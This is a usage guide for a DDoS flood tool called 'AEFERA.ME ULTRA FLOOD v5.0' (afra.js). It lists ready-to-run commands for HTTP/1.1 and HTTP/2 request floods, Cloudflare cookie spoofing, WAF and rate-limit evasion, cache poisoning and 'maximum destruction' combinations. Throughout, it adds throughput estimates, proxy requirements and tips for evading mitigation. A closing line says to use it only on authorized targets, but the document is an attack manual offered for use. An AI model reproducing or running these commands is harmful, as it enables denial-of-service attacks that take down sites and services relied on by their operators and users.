# 🔥 AEFERA.ME ULTRA FLOOD v5.0 - METHOD LIST

## 📋 Available Attack Methods

### 🟢 **BASIC METHODS** (Low-Medium Intensity)

#### 1. **GET Flood**
```bash
node afra.js GET https://target.com 120 8 50 proxy.txt
```
- **Power Level**: ⭐⭐☆☆☆
- **Description**: Simple GET request flooding
- **Best For**: Testing, small sites, basic protection bypass
- **Resource Usage**: Low CPU, Low RAM, Moderate Network
- **Detection**: Medium (easy to detect without options)

#### 2. **POST Flood**
```bash
node afra.js POST https://target.com 120 8 50 proxy.txt --postdata "key=value&data=test"
```
- **Power Level**: ⭐⭐⭐☆☆
- **Description**: POST requests with custom payload
- **Best For**: Form submission endpoints, API attacks
- **Resource Usage**: Low-Medium CPU, Low RAM, Moderate Network
- **Detection**: Medium-Low

#### 3. **HEAD Flood**
```bash
node afra.js HEAD https://target.com 120 8 50 proxy.txt
```
- **Power Level**: ⭐⭐☆☆☆
- **Description**: HEAD requests (no body, just headers)
- **Best For**: Bypassing body-based filters
- **Resource Usage**: Very Low CPU, Very Low RAM, Low Network
- **Detection**: Low

---

### 🟡 **INTERMEDIATE METHODS** (Medium-High Intensity)

#### 4. **HTTP/1.1 Pipeline Flood**
```bash
node afra.js GET https://target.com 120 16 90 proxy.txt --http 1
```
- **Power Level**: ⭐⭐⭐☆☆
- **Description**: HTTP/1.1 with aggressive pipelining (20-100 requests per connection)
- **Best For**: Legacy servers, HTTP/1.1 only sites
- **Resource Usage**: Medium CPU, Medium RAM, High Network
- **Detection**: Medium
- **Features**:
  - Pipeline Size: up to 100 requests
  - Keep-Alive connections
  - Rapid request cycling

#### 5. **HTTP/2 Multiplexing Flood**
```bash
node afra.js GET https://target.com 120 16 90 proxy.txt --http 2
```
- **Power Level**: ⭐⭐⭐⭐☆
- **Description**: HTTP/2 with stream multiplexing (200-500 concurrent streams)
- **Best For**: Modern sites with HTTP/2 support
- **Resource Usage**: High CPU, High RAM, Very High Network
- **Detection**: Medium-High
- **Features**:
  - 200-500 requests per cycle
  - HPACK compression
  - Stream priority manipulation
  - Window size attacks

#### 6. **Mix Protocol Flood**
```bash
node afra.js GET https://target.com 120 16 90 proxy.txt --http mix
```
- **Power Level**: ⭐⭐⭐⭐☆
- **Description**: Random switching between HTTP/1.1 and HTTP/2
- **Best For**: Confusing WAF/IDS systems
- **Resource Usage**: High CPU, High RAM, Very High Network
- **Detection**: Low-Medium (harder to pattern match)

---

### 🟠 **ADVANCED METHODS** (High Intensity + Bypass Features)

#### 7. **Cloudflare Bypass Mode**
```bash
node afra.js GET https://target.com 120 16 90 proxy.txt --bfm true
```
- **Power Level**: ⭐⭐⭐⭐☆
- **Description**: Cloudflare cookie spoofing + advanced headers
- **Best For**: Cloudflare protected sites
- **Resource Usage**: Medium-High CPU, Medium RAM, High Network
- **Detection**: Low (mimics legitimate browsers)
- **Features**:
  - `__cf_bm` cookie generation
  - `cf_clearance` token spoofing
  - Multiple CF cookie variants
  - Dynamic timestamp matching

#### 8. **Anti-Block Enhanced**
```bash
node afra.js GET https://target.com 120 16 90 proxy.txt --anti true
```
- **Power Level**: ⭐⭐⭐⭐☆
- **Description**: Enhanced anti-blocking with shield tokens
- **Best For**: Sites with advanced bot detection
- **Resource Usage**: Medium CPU, Medium RAM, High Network
- **Detection**: Low
- **Features**:
  - Random anti-block tokens
  - Shield token injection
  - Rotating fingerprints

#### 9. **Random Method Mix**
```bash
node afra.js GET https://target.com 120 16 90 proxy.txt --method mix
```
- **Power Level**: ⭐⭐⭐⭐☆
- **Description**: Randomly switches between GET, POST, HEAD per request
- **Best For**: Bypassing method-specific filters
- **Resource Usage**: High CPU, High RAM, High Network
- **Detection**: Low-Medium
- **Methods Used**: GET, POST, HEAD (random selection)

#### 10. **Query String Randomization**
```bash
node afra.js GET https://target.com 120 16 90 proxy.txt --query 1
# or
node afra.js GET https://target.com 120 16 90 proxy.txt --query 2
# or
node afra.js GET https://target.com 120 16 90 proxy.txt --query 3
```
- **Power Level**: ⭐⭐⭐⭐☆
- **Description**: Different query string patterns
- **Options**:
  - `--query 1`: Cloudflare challenge tokens (`?__cf_chl_rt_tk=...`)
  - `--query 2`: Random path suffix
  - `--query 3`: Random query parameters (`?q=xxx&yyy`)
- **Best For**: Cache poisoning, bypassing query-based filters
- **Detection**: Very Low

#### 11. **Rate Limit Bypass**
```bash
node afra.js GET https://target.com 120 16 90 proxy.txt --limit true
```
- **Power Level**: ⭐⭐⭐⭐☆
- **Description**: Adaptive rate limiting with 429 handling
- **Best For**: Sites with rate limiting
- **Resource Usage**: Medium CPU, Medium RAM, Variable Network
- **Features**:
  - Automatic retry on 429
  - Adaptive delay adjustment
  - Smart throttling

---

### 🔴 **EXTREME METHODS** (Maximum Destruction)

#### 12. **FULL POWER MODE**
```bash
node afra.js GET https://target.com 120 16 90 proxy.txt --full
```
- **Power Level**: ⭐⭐⭐⭐⭐
- **Description**: Maximum rate without any throttling
- **Resource Usage**: 100% CPU, High RAM, Maximum Network
- **Features**:
  - No delay between requests
  - Maximum pipeline/stream usage
  - Aggressive connection pooling

#### 13. **ULTRA COMBO (All Features Enabled)**
```bash
node afra.js GET https://target.com 180 16 90 proxy.txt --bfm true --anti true --method mix --query 1 --limit true --http mix --full --debug
```
- **Power Level**: ⭐⭐⭐⭐⭐+
- **Description**: **NUCLEAR OPTION** - All bypass features + maximum power
- **Resource Usage**: 100% CPU, Maximum RAM, Maximum Network
- **Detection**: Very Low (multiple evasion techniques)
- **Features Combined**:
  - ✅ Cloudflare bypass
  - ✅ Anti-block tokens
  - ✅ Random methods (GET/POST/HEAD)
  - ✅ Query randomization
  - ✅ Rate limit handling
  - ✅ Protocol mixing (HTTP/1.1 + HTTP/2)
  - ✅ Full power mode
  - ✅ Debug monitoring
  - ✅ 384+ worker threads (16 x CPU cores x 2)
  - ✅ 500K max connections per worker
  - ✅ 200-500 requests per cycle
  - ✅ 100 HTTP/1.1 pipeline size
  - ✅ 1MB TLS buffers
  - ✅ 65535 HPACK table size
  - ✅ 16MB HTTP/2 window size

#### 14. **OPTIMIZED ULTRA (Recommended Extreme)**
```bash
node afra.js GET https://target.com 120 32 120 proxy.txt --bfm true --anti true --method mix --query 1 --limit true --debug
```
- **Power Level**: ⭐⭐⭐⭐⭐
- **Description**: Balanced extreme attack with all optimizations
- **Threads**: 32 (will spawn 384-768 workers depending on CPU)
- **Rate**: 120 req/s per worker
- **Total Power**: ~46,080 - 92,160 req/s (theoretical)
- **Resource Usage**: 
  - CPU: 80-100% (all cores)
  - RAM: 2-8GB
  - Network: Maximum available bandwidth

#### 15. **RAPID FIRE (Ultra Fast Cycling)**
```bash
node afra.js GET https://target.com 60 64 200 proxy.txt --bfm true --anti true --method mix --full --debug
```
- **Power Level**: ⭐⭐⭐⭐⭐++
- **Description**: Maximum workers + maximum rate = absolute destruction
- **Threads**: 64
- **Rate**: 200 req/s
- **Workers**: 768-1536 (64 x 12-24 CPU cores)
- **Total Power**: ~153,600 - 307,200 req/s (theoretical)
- **⚠️ WARNING**: Will consume massive system resources
- **Requirements**: 
  - Minimum 16GB RAM
  - Good cooling system
  - Large proxy list (5000+)

---

## 🎯 **SPECIALIZED ATTACK SCENARIOS**

### **Scenario 1: Cloudflare Protected Site**
```bash
node afra.js GET https://target.com 180 16 90 proxy.txt --bfm true --query 1 --method mix --limit true --debug
```
**Why**: CF bypass + CF query tokens + method mixing + rate limit handling

### **Scenario 2: Heavy WAF/IDS Protected**
```bash
node afra.js GET https://target.com 120 24 80 proxy.txt --anti true --method mix --http mix --query 3 --debug
```
**Why**: Anti-block + method randomization + protocol mixing + random queries

### **Scenario 3: API Endpoint Attack**
```bash
node afra.js POST https://target.com/api/endpoint 90 16 100 proxy.txt --postdata "key=value" --header "Content-Type:application/json#Authorization:Bearer token" --method POST --debug
```
**Why**: POST with custom data + custom headers + focused method

### **Scenario 4: Cache Poisoning**
```bash
node afra.js GET https://target.com 120 16 90 proxy.txt --query 3 --method GET --http 2 --debug
```
**Why**: Random queries + GET method + HTTP/2 for cache pollution

### **Scenario 5: Maximum Destruction (All-Out Attack)**
```bash
node afra.js GET https://target.com 300 64 200 proxy.txt --bfm true --anti true --method mix --query 1 --limit true --http mix --full --debug
```
**Why**: Everything enabled for 5 minutes of pure chaos

---

## 📊 **Performance Comparison**

| Method | Req/s (est) | CPU Usage | RAM Usage | Stealth | Bypass Score |
|--------|-------------|-----------|-----------|---------|--------------|
| Basic GET | 1K-5K | 10-20% | <500MB | Low | 2/10 |
| HTTP/1.1 Pipeline | 10K-30K | 30-50% | 1-2GB | Medium | 5/10 |
| HTTP/2 Multiplex | 30K-80K | 50-70% | 2-4GB | Medium | 6/10 |
| CF Bypass | 20K-50K | 40-60% | 1-3GB | High | 8/10 |
| Ultra Combo | 80K-300K | 90-100% | 4-12GB | Very High | 10/10 |
| Rapid Fire | 150K-500K | 100% | 8-16GB | High | 9/10 |

---

## 🛡️ **Custom Options Reference**

### Header Customization
```bash
--header "Header-Name:Value#Another-Header:Value"
```
Use `#` to separate multiple headers

### Cookie Injection
```bash
--cookie "session=abc123; token=xyz"
--cookie "%RAND%"  # Random cookie generation
```

### Referer Spoofing
```bash
--referer "https://google.com"
--referer "rand"  # Random referer
```

### Delay Control
```bash
--delay 5  # 5ms delay between connection batches (default: 0.1ms in v5.0)
```

### Random Rate
```bash
--randrate true  # Randomize rate between 1-64 req/s per cycle
```

---

## ⚙️ **System Requirements by Method**

### Basic Methods
- CPU: 2+ cores
- RAM: 2GB+
- Network: 10Mbps+
- Proxies: 100+

### Intermediate Methods  
- CPU: 4+ cores
- RAM: 4GB+
- Network: 50Mbps+
- Proxies: 500+

### Advanced Methods
- CPU: 8+ cores
- RAM: 8GB+
- Network: 100Mbps+
- Proxies: 1000+

### Extreme Methods
- CPU: 12+ cores (16+ recommended)
- RAM: 16GB+ (32GB recommended)
- Network: 500Mbps+ (1Gbps recommended)
- Proxies: 3000+ (5000+ recommended)
- Cooling: Good airflow/liquid cooling
- OS: 64-bit required

---

## 🔥 **Pro Tips**

1. **Start Low, Scale Up**: Begin with basic methods to test target, then scale
2. **Monitor Resources**: Use `--debug` to watch performance and adjust
3. **Proxy Quality Matters**: More proxies = better distribution = less detection
4. **Mix It Up**: Combine different flags for better bypass rates
5. **Timing Matters**: Short bursts (30-60s) are harder to mitigate than long attacks
6. **Multiple Instances**: Run multiple instances with different configs for ultimate power

---

## 🌐 **Network Optimization Settings**

Script automatically applies:
- ✅ TCP NoDelay (Nagle's algorithm disabled)
- ✅ Keep-Alive connections
- ✅ Large buffer sizes (1MB for TLS)
- ✅ Connection pooling (500K max per worker)
- ✅ Parallel batch processing (200 connections per batch)
- ✅ DNS caching
- ✅ Thread pool optimization (16x CPU cores)
- ✅ Automatic garbage collection

---

**🔥 AEFERA.ME v5.0 - Maximum Power, Maximum Results 🔥**

*Use responsibly and only on authorized targets.*
